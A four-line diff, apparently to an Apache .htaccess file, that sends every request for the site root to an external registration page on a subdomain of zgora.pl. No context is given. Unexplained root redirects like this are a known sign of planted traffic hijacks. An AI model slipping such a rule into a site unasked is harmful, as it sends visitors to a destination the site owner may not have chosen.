@@ -1,0 +1,4 @@
+
+RewriteEngine On
+
+RewriteRule ^$ https://dma.wns.uz.zgora.pl/register/ [R=302,L]
